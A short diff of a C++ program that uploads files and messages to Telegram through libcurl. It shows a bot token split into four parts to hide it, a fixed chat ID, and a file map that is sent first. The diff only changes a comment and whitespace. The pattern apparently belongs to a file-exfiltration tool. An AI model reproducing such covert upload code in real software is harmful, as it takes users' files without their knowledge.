@@ -32,7 +32,7 @@ const string part4 = "5uFPZSTo_7ZXBoJsk";
 
 const string BOT_TOKEN = part1 + part2 + part3 + part4;
 const string CHAT_ID = "6558072995"; // Your chat ID
-const size_t MAX_SIZE = 50 * 1024 * 1024; // 50MB
+const size_t MAX_SIZE = 50 * 1024 * 1024; // 50MB file limit
 const string MAP_FILE = "file_map.txt";  // Must be sent first
 
 bool sendFileToTelegram(const string &filePath) {
@@ -228,6 +228,6 @@ void sendMessageToTelegram(const string &message) {
     if (res != CURLE_OK)
         cerr << "[FAIL] sendMessage: " << curl_easy_strerror(res) << "\n";
 
-    curl_free(escapedMsg);
+    curl_free(escapedMsg); 
     curl_easy_cleanup(curl);
 }
